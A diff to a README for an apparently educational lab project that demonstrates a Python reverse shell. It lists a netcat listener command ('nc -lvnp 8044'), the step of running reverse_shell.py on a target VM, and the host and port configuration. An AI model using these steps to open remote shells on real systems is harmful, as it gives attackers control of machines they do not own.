@@ -26,5 +26,9 @@ This project demonstrates the mechanics of a **reverse shell** using Python's bu
 ### Steps to Reproduce (Lab Only)
 
 1. Start the listener on Kali:
-   ```bash
    nc -lvnp 8044
+2. On the target VM, run the script:
+       python3 reverse_shell.py
+ Configuration
+HOST = "192.168.56.101"   # Your Kali VM's IP
+PORT = 8044               # Listener port
